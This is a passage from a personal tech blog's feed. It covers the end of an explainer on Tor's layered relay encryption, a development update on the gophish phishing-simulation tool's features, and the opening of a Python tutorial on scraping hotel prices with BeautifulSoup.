The client encrypts the original data in such a way that only the exit relay can decrypt it.</p>

<p><span class="fa-stack fa-lg fa-1x">
<i class="fa fa-circle fa-stack-2x" style="color:#3498DB"></i>
<i class="fa fa-stack-1x" style="color:white; font-family:inherit;">2</i>
</span>
This encrypted data is then encrypted again in such a way that only the middle relay can decrypt it.</p>

<p><span class="fa-stack fa-lg fa-1x">
<i class="fa fa-circle fa-stack-2x" style="color:#3498DB"></i>
<i class="fa fa-stack-1x" style="color:white; font-family:inherit;">3</i>
</span>
Finally, this encrypted data is encrypted once more in such a way that only the guard relay can decrypt it.</p>

<div style="padding:10px;background:#3498DB;border-radius:5px;">
<svg
   xmlns:dc="http://purl.org/dc/elements/1.1/"
   xmlns:cc="http://creativecommons.org/ns#"
   xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
   xmlns:svg="http://www.w3.org/2000/svg"
   xmlns="http://www.w3.org/2000/svg"
   id="encryption"
   width="100%"
   height="191"
   viewBox="0 0 577 192"
   style="max-height:190px"
   onclick="s.reset().play();"
   version="1.0">
   <style
      id="style3946">
    .style0{
        fill:   none;
        stroke: #000000;
        stroke-width:   3;
        stroke-linejoin:    round;
    }
    .style1{
        fill:   none;
        stroke: #000000;
        stroke-width:   3;
    }
    .style2{
        font-size:  11.9px;
        line-height:    125%;
        letter-spacing: 0px;
        word-spacing:   0px;
        fill:   #000000;
        font-family:    Sans;
    }
    .style3{
        font-size:  11.9px;
    }
 </style>
   <metadata
      id="metadata1928">
     <rdf:RDF>
       <cc:Work
          rdf:about="">
         <dc:format>image/svg+xml</dc:format>
         <dc:type
            rdf:resource="http://purl.org/dc/dcmitype/StillImage" />
         <dc:title></dc:title>
       </cc:Work>
     </rdf:RDF>
   </metadata>
   <defs
      id="defs1926" />
   <path
      id="path1934"
      d="m 354.4,37.8 c 12.5,0 22.9,34.2 22.9,75.7 0,41.6 -10.2,76.4 -22.7,76.4 -12.5,0 -22.7,-34.9 -22.7,-76.4 0,-41.5 9.9,-75.7 22.5,-75.7 z m 0,0 197,-0.3 c 11,0 24.3,34 24.3,75.8 0,41.9 -13,76.7 -24,76.7 l -197.2,-0.1"
      inkscape:connector-curvature="0"
      class="style0"
      style="fill:#ffffff;stroke:#4183d7;stroke-width:3;stroke-linejoin:round;fill-opacity:1;stroke-opacity:1" />
   <path
      id="path1934-1"
      d="m 292.9,56.4 c 4.6,0 8.5,25.5 8.5,56.7 0,31.1 -3.7,57.2 -8.4,57.2 -4.6,0 -8.4,-26.0 -8.4,-57.2 0,-31.1 3.7,-56.7 8.4,-56.7 z m 0,0 73.6,-0.2 c 4.1,0 9.1,25.4 9.1,56.8 0,31.3 -4.8,57.4 -8.9,57.4 l -73.6,-0.1"
      inkscape:connector-curvature="0"
      class="style0"
      style="fill:#ffffff;stroke:#4183d7;stroke-width:3;stroke-linejoin:round;stroke-miterlimit:4;stroke-dasharray:none;fill-opacity:1;stroke-opacity:1" />
   <path
      id="path1934-1-7"
      d="m 254.9,82.9 c 2.6,0 4.9,14.9 4.9,33.3 0,18.2 -2.1,33.6 -4.8,33.6 -2.6,0 -4.8,-15.2 -4.8,-33.6 0,-18.2 2.1,-33.3 4.8,-33.3 z m 0,0 42.3,-0.1 c 2.3,0 5.2,14.9 5.2,33.3 0,18.4 -2.7,33.7 -5.1,33.7 l -42.3,0"
      inkscape:connector-curvature="0"
      class="style0"
      style="fill:#ffffff;stroke:#4183d7;stroke-width:3;stroke-linejoin:round;stroke-miterlimit:4;stroke-dasharray:none;stroke-opacity:1;fill-opacity:1" />
   <path
      id="path1934-1-4"
      d="m 228.2,97.7 c 1.8,0 3.4,9.2 3.4,20.5 0,11.3 -1.5,20.7 -3.3,20.7 -1.8,0 -3.3,-9.4 -3.3,-20.7 0,-11.3 1.4,-20.5 3.3,-20.5 z m 0,0 29.4,-0.1 c 1.6,0 3.6,9.2 3.6,20.5 0,11.4 -1.9,20.7 -3.5,20.7 l -29.4,0"
      inkscape:connector-curvature="0"
      class="style0"
      style="fill:#ffffff;stroke:#4183d7;stroke-width:2.2;stroke-linejoin:round;stroke-opacity:1;fill-opacity:1" />
   <text
      xml:space="preserve"
      x="-4.7"
      y="10.2"
      id="text4004"
      style="font-size:14.0px;-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;fill:#ffffff"><tspan
        sodipodi:role="line"
        x="-4.7"
        y="10.2"
        id="tspan4006"
        style="font-size:12px;fill:#ffffff"><tspan
          x="-4.7"
          y="10.2"
          id="tspan4008"
          style="-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;font-size:12px;fill:#ffffff">Guard Relay Encryption</tspan></tspan></text>
   <text
      xml:space="preserve"
      x="-5.8"
      y="32.1"
      id="text3998"
      style="font-size:14.1px;-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;fill:#ffffff"><tspan
        sodipodi:role="line"
        x="-5.8"
        y="32.1"
        id="tspan4000"
        style="font-size:12px;fill:#ffffff"><tspan
          x="-5.8"
          y="32.1"
          id="tspan4002"
          style="-inkscape-font-specification:Segoe UI;font-family:Segoe UI;font-weight:normal;font-style:normal;font-stretch:normal;font-variant:normal;font-size:12px;fill:#ffffff">Middle Relay Encryption</tspan></tspan></text>
   <text
      xml:space="preserve"
      x="-5.1"
      y="52.7"
      id="text3992"
      style="font-size:14.0px;font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;font-family:Segoe UI;-inkscape-font-specification:Segoe UI;fill:#ffffff"><tspan
        sodipodi:role="line"
        x="-5.1"
        y="52.7"
        id="tspan3994"
        style="font-size:12px;fill:#ffffff"><tspan
          x="-5.1"
          y="52.7"
          id="tspan3996"
          style="font-size:12px;font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;font-family:Segoe UI;-inkscape-font-specification:Segoe UI;fill:#ffffff">Exit Relay Encryption</tspan></tspan></text>
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 548.4,36.3 c 0,0 41.8,75.0 0,153.5"
      id="path6775"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 533.9,37.6 c 0,0 41.8,75.0 0,153.5"
      id="path6775-2"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 517.8,37.7 c 0,0 41.8,75.0 0,153.5"
      id="path6775-8-4"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 503.3,36.7 c 0,0 41.8,75.0 0,153.5"
      id="path6775-5"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 487.1,36.8 c 0,0 41.8,75.0 0,153.5"
      id="path6775-8-2"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 470.8,37.9 c 0,0 41.8,75.0 0,153.5"
      id="path6775-8-8"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 451.6,39.1 c 0,0 41.8,75.0 0,153.5"
      id="path6775-8-9"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 433.6,35.6 c 0,0 41.8,75.0 0,153.5"
      id="path6775-23"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 414.4,36.7 c 0,0 41.8,75.0 0,153.5"
      id="path6775-62"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 396.1,36.7 c 0,0 41.8,75.0 0,153.5"
      id="path6775-57"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 380.0,36.8 c 0,0 41.8,75.0 0,153.5"
      id="path6775-8-827"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 360.4,170.4 c 0,0 18.9,-42.4 0,-114.0"
      id="path6924"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 353.0,170.9 c 0,0 18.9,-42.4 0,-114.0"
      id="path6924-0"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 344.8,171.8 c 0,0 18.9,-42.4 0,-114.0"
      id="path6924-5"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 336.7,170.7 c 0,0 18.9,-42.4 0,-114.0"
      id="path6924-5-5"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 328.7,170.7 c 0,0 18.9,-42.4 0,-114.0"
      id="path6924-5-2"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 320.1,169.6 c 0,0 18.9,-42.4 0,-114.0"
      id="path6924-5-7"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 311.5,169.6 c 0,0 18.9,-42.4 0,-114.0"
      id="path6924-5-6"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 303.5,171.3 c 0,0 18.9,-42.4 0,-114.0"
      id="path6924-5-78"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 293.1,149.8 c 0,0 7.4,-30.9 0,-65.8"
      id="path7008"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 288.8,148.9 c 0,0 7.4,-30.9 0,-65.8"
      id="path7008-7"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 283.7,148.9 c 0,0 7.4,-30.9 0,-65.8"
      id="path7008-8"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 278.5,149.5 c 0,0 7.4,-30.9 0,-65.8"
      id="path7008-1"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 273.9,149.8 c 0,0 7.4,-30.9 0,-65.8"
      id="path7008-6"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 268.8,148.6 c 0,0 7.4,-30.9 0,-65.8"
      id="path7008-0"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:1px;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1"
      d="m 263.3,148.9 c 0,0 7.4,-30.9 0,-65.8"
      id="path7008-9"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 254.8,97.7 c 0,0 8.0,17.9 0,41.2"
      id="path7074"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 252.7,97.9 c 0,0 8.0,17.9 0,41.2"
      id="path7074-8"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 250.6,97.4 c 0,0 8.0,17.9 0,41.2"
      id="path7074-9"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 248.6,96.8 c 0,0 8.0,17.9 0,41.2"
      id="path7074-0"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 246.1,97.2 c 0,0 8.0,17.9 0,41.2"
      id="path7074-00"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 243.6,98.2 c 0,0 8.0,17.9 0,41.2"
      id="path7074-7"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 241.1,98.1 c 0,0 8.0,17.9 0,41.2"
      id="path7074-2"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 238.7,97.9 c 0,0 8.0,17.9 0,41.2"
      id="path7074-5"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 236.3,97.2 c 0,0 8.0,17.9 0,41.2"
      id="path7074-52"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 233.8,98.2 c 0,0 8.0,17.9 0,41.2"
      id="path7074-1"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#4183d7;stroke-width:0.7;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 231.5,98.2 c 0,0 8.0,17.9 0,41.2"
      id="path7074-4"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#ffffff;stroke-width:2;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1;stroke-miterlimit:4;stroke-dasharray:none"
      d="m 345.5,37.5 -153.5,0 -51.4,-29.7"
      id="path7159"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#ffffff;stroke-width:2;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1;stroke-miterlimit:4;stroke-dasharray:none"
      d="m 287.0,56.4 -98.3,0 -49.3,-28.2"
      id="path7161"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#ffffff;stroke-width:2;stroke-linecap:butt;stroke-linejoin:miter;stroke-miterlimit:4;stroke-opacity:1;stroke-dasharray:none"
      d="m 248.7,82.2 -57.3,0 -53.0,-28.3"
      id="path7163"
      inkscape:connector-curvature="0" />
   <path
      style="fill:none;stroke:#ffffff;stroke-width:2;stroke-linecap:butt;stroke-linejoin:miter;stroke-opacity:1;stroke-miterlimit:4;stroke-dasharray:none"
      d="m 221.7,117.7 -33.2,0 -55.3,-31.9"
      id="path7165"
      inkscape:connector-curvature="0" />
   <text
      xml:space="preserve"
      x="-5.1"
      y="80.6"
      id="text3992-8"
      style="font-size:14.0px;font-style:normal;font-variant:normal;font-weight:normal;font-stretch:normal;fill:#ffffff;font-family:Segoe UI;-inkscape-font-specification:Segoe UI"><tspan
        sodipodi:role="line"
        x="-5.1"
        y="80.6"
        id="tspan3994-6"
        style="font-size:12px;fill:#ffffff">Original Data</tspan></text>
 </svg>
       </div>


<br/>


<p>This means that we have wrapped our original data in layers of encryption, much like an onion is wrapped in layers of&hellip;well, more onion, I guess.</p>

<p>By doing this, each relay only has the information it needs to know &ndash; where it got the encrypted data from, and where to send it to next. Encrypting data this way is beneficial to both parties: client traffic isn&rsquo;t compromised and relays can&rsquo;t be held liable for data they can&rsquo;t see.</p>

<blockquote><p>Note: It&rsquo;s important to remember that exit relays <strong>can see the original data sent by the client</strong>, since they have to pass that data to the destination. This means that, if credentials are passed over HTTP, FTP, or other cleartext protocols, the exit relays can sniff the traffic!</p></blockquote>

<h3>Next Steps</h3>

<p>Our journey into the operation of Tor is just beginning. In future posts, we&rsquo;ll take a look at how the Tor network is organized, discuss the differences between relays and bridges, take a deep-dive into how exactly the encryption works, take a step-by-step view of what happens behind the scenes when you start up your Tor client for the first time, and more.</p>

<p>We have a lot to cover! Until then, feel free to read up on the official <a href="https://gitweb.torproject.org/torspec.git/tree/">Tor specifications</a>.</p>

<p>As always, please let me know if you have any questions or comments below!</p>

<p>Jordan</p>

<p><em>Update: <a href="http://jordan-wright.github.io/blog/2015/05/09/how-tor-works-part-two-relays-vs-bridges/">Part two &ndash; &ldquo;Relays vs. Bridges&rdquo;</a> has been published!</em></p>

<div>
<script>
d= new Vivus('earth', {type: 'oneByOne', duration: 30, start: 'inViewport', forceRender: false, dashGap: 20});
s= new Vivus('encryption', {type: 'async', duration: 30, start: 'inViewport', forceRender: false, dashGap: 20});
e= new Vivus('network', {type: 'oneByOne', duration: 30, start: 'inViewport', forceRender: false, dashGap: 20});
</script>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Gophish Update: Getting Closer to Alpha!]]></title>
    <link href="http://jordan-wright.github.io/blog/2015/02/26/gophish-update-getting-closer-to-alpha/"/>
    <updated>2015-02-26T20:50:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2015/02/26/gophish-update-getting-closer-to-alpha</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/gophish_purple.png"/></p>

<h3>Introduction</h3>

<p>It&rsquo;s been a busy couple of months!</p>

<p>I thought it would be worth providing a long-overdue update into the development status of <a href="http://github.com/jordan-wright/gophish">gophish</a>. Overall, the project is getting closer to beta status every day, and I&rsquo;m hoping to see a <a href="https://github.com/jordan-wright/gophish/milestones">0.1 release</a> at the end of March.</p>

<p>Without further ado, let&rsquo;s dive in and see where we&rsquo;re at.</p>

<!--more-->


<h3>Design</h3>

<p>I moved away from the previous black and white look to a friendlier color scheme using the fantastic <a href="http://designmodo.github.io/Flat-UI/">Flat-UI</a> package from DesignModo.</p>

<h3>Features</h3>

<p>My goal is to make using gophish both easy-to-use and powerful. With this in mind, I&rsquo;ve implemented some neat features to make setting up awesome campaigns as simple as possible.</p>

<p>Let&rsquo;s take a look at a few:</p>

<h4>WYSIWYG Editing of HTML Templates</h4>

<p>You can make pixel perfect email and landing page templates and customize the content seamlessly. While I started with some <code>contenteditable</code> hacks, I couldn&rsquo;t find a reliable way to allow full page rendering (without opening up security issues or design incompatibility problems). So, I looked around and found that <a href="http://ckeditor.com">CKEditor</a> which takes care of this and more!</p>

<p>Now we can switch between a raw HTML source view and a fully rendered view in just one-click. Want to see what a template would look like full-screen? Also no problem!</p>

<p><img src="http://jordan-wright.github.io/images/blog/gophish_screenshots/gophish_template.gif"/></p>

<h4>Email Attachments</h4>

<p>Sending emails with links in them is great, but if we can&rsquo;t add &ldquo;malicious&rdquo; attachments to emails we send, then we miss a <em>huge</em> attack tactic deployed against our users. I&rsquo;m excited to report that attaching files to email templates is just a matter of selecting the &ldquo;Add Files&rdquo; button on the email template modal and choosing the file you want to attach. Easy as that!</p>

<h4>Bulk Importing of Users</h4>

<p>Adding users to a group manually is a <em>pain</em>. So, I&rsquo;ve implemented bulk inserting that accepts a CSV file, and adds the users automatically. Right now, it allows for the following fields:</p>

<ul>
<li>First Name</li>
<li>Last Name</li>
<li>Email</li>
<li>Position</li>
</ul>


<p><img src="http://jordan-wright.github.io/images/blog/gophish_screenshots/gophish_group.gif"/></p>

<h4>Campaign Results Dashboard</h4>

<p>Executing campaigns isn&rsquo;t helpful if you don&rsquo;t have a way to see the results. This is why I&rsquo;ve been working on a campaign results dashboard that will serve as a one-stop-shop for viewing campaign results. The plan is to start by having information about the campaign itself, such as clicks over time and overall success rate. However, I want to expand this to also include information about the user, such as browser plugin information, demographics and location, etc.</p>

<p><img src="http://jordan-wright.github.io/images/blog/gophish_screenshots/gophish_campaign_results.gif"/></p>

<h4>Full API Support</h4>

<p>From the get-go, gophish was <strong>designed for automation</strong>. Setting up campaigns, importing users, getting results can all be done manually through the Web UI. However, all the UI does is call out to the API. For darn-near <em>everything</em>.</p>

<p>To take a look at the API documentation, just load up gophish and head over to <code>/api</code>!</p>

<h4>Coming Soon</h4>

<p>While I&rsquo;m proud of all that&rsquo;s been accomplished with gophish so far, it&rsquo;s not even close to being done.</p>

<p>Here are just a few of the <em>many</em> features coming down the pipeline to get excited about:</p>

<ul>
<li>A more fleshed out Campaign Results dashboard (<span><i class="fa fa-heart-o"></i></span> metrics)</li>
<li>Ability to schedule campaigns in advance</li>
<li>Email tracking &ndash; know when an email is opened!</li>
<li>The ability to clone a landing page template with one click</li>
<li>Support for importing emails from the &ldquo;Source&rdquo; of an existing email (or hopefully even an IMAP service directly!)</li>
<li>&ldquo;Teams&rdquo; support to share and coordinate phishing campaigns</li>
<li>Realtime updates to campaign results dashboard</li>
<li>Client API libraries (eg Python)</li>
</ul>


<h3>Conclusion</h3>

<p>Gophish development continues to push forward as much as possible. While I&rsquo;m balancing time between a few different projets, I hope to get gophish alpha out the door as soon as possible. As always, please don&rsquo;t hesitate to let me know if you have any questions or comments! Also, if you use gophish and have any ideas/issues, let me know on <a href="http://github.com/jordan-wright/gophish/issues">Github</a>!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Web Scraping Hotel Prices for Fun and Savings]]></title>
    <link href="http://jordan-wright.github.io/blog/2015/02/21/web-scraping-hotel-prices-for-fun-and-savings/"/>
    <updated>2015-02-21T12:05:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2015/02/21/web-scraping-hotel-prices-for-fun-and-savings</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/web_scraping.png"/></p>

<h3>Introduction</h3>

<p>During the process of planning a vacation, I came across a nice hotel I wanted to stay at. When looking at some possible dates, I noticed the nightly rate would fluctuate <em>dramatically</em>. This made me question if I was going to wind up paying way more just because I wanted to stay at the hotel on a certain day.</p>

<p>Then I considered the alternative &ndash; maybe I could scrape the prices every day to find the cheapest nightly rate. Sounded like a job for Python, BeautifulSoup, and some whiskey.</p>

<!--more-->


<h3>A Brief Intro to Python Web Scraping</h3>

<p>Web scraping with Python is generally done using a mixture of the fantastic <code>requests</code> and <code>beautifulsoup</code> libraries. This post won&rsquo;t go into detail about all the neat features of <code>beautifulsoup</code>, instead aiming for simplicity to show the basics.</p>

<h4>Getting a BeautifulSoup Object</h4>

<p>The first step in web scraping is getting the HTML you want, and creating a parseable object out of it. We can do this by requesting a page with <code>requests.get()</code> and, if successful, creating a BeautifulSoup object using the <code>BeautifulSoup()</code> constructor with the <code>.text</code> of our response.</p>

<p>It would look something like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>response = requests.get('http://foo.bar')
</span><span class='line'>if response.ok:
</span><span class='line'>    soup = BeautifulSoup(response.text)</span></code></pre></td></tr></table></div></figure>


<h4>Getting Data From BeautifulSoup</h4>

<p>Now that we have a BeautifulSoup object, we can use its API to get the data we want. The first step is to parse out the <code>Tag</code> object we are interested in. Then, we can parse out the text/attributes we want. Here are some examples of getting specific tags:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>soup.find_all('a') # Get all &lt;a&gt; tags
</span><span class='line'>soup.find_all('a', {"class" : "css_class"}) # Get all &lt;a class="css_class"&gt; tags
</span><span class='line'>soup.find_all('a', 'css_class') # Shortcut for searching by class
</span><span class='line'>soup.find() # Same as find_all(), but returns the first instance</span></code></pre></td></tr></table></div></figure>


<p>After we have the <code>Tag</code> object we want, we can parse out the text by accessing the <code>.text</code> attribute.</p>

<p>This is <em>barely</em> scratching the surface of BeautifulSoup&rsquo;s API, so if you&rsquo;re interested in learning more, you can take a look at the docs <a href="http://www.crummy.com/software/BeautifulSoup/bs4/doc/">here</a>. That&rsquo;s all we&rsquo;ll need for this post, so let&rsquo;s see this in action.</p>

<h3>Parsing Some (Not Great) HTML</h3>

<p>The goal was to simply pull down the rate for each day, and dump it out to a CSV (&ldquo;rates.csv&rdquo;) for some sweet Excel graphing later.</p>

<p>I&rsquo;ll leave the exact hotel and URL redacted, but the basic URL was in the form:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://foo.bar?month=:int&day=:int&year=:int</span></code></pre></td></tr></table></div></figure>


<p>We can start with a naive approach of looping through the months I was interested in (August through December) and getting a BeautifulSoup object from each result.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import requests
</span><span class='line'>from bs4 import BeautifulSoup
</span><span class='line'>import time
</span><span class='line'>
</span><span class='line'>with open('rates.csv', 'w') as rates:
</span><span class='line'>    rates.write("Date,Rate\n")
</span><span class='line'>    for m in range(8,13):
</span><span class='line'>        for d in range(1,32):
</span><span class='line'>            try:
</span><span class='line'>                response = requests.get('http://foo.bar?month=' + str(m) + '&day=' + str(d) + '&year=2015')
</span><span class='line'>                if response.ok:
</span><span class='line'>                    soup = BeautifulSoup(response.text)
</span><span class='line'>            except Exception e:
</span><span class='line'>                print e
</span><span class='line'>            # Be (somewhat) nice.
</span><span class='line'>            time.sleep(.2)</span></code></pre></td></tr></table></div></figure>


<p>Now we just need to figure out what kind of data we care about. This site used tables. <strong>A lot.</strong> After some testing, I wound up parsing HTML that looked like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;table summary="rooms availability"&gt;
</span><span class='line'>    &lt;tbody&gt;
</span><span class='line'>        &lt;tr&gt;
</span><span class='line'>            &lt;td&gt;
</span><span class='line'>                &lt;div class="roomSection"&gt;
</span><span class='line'>                    &lt;div class="roomType"&gt;
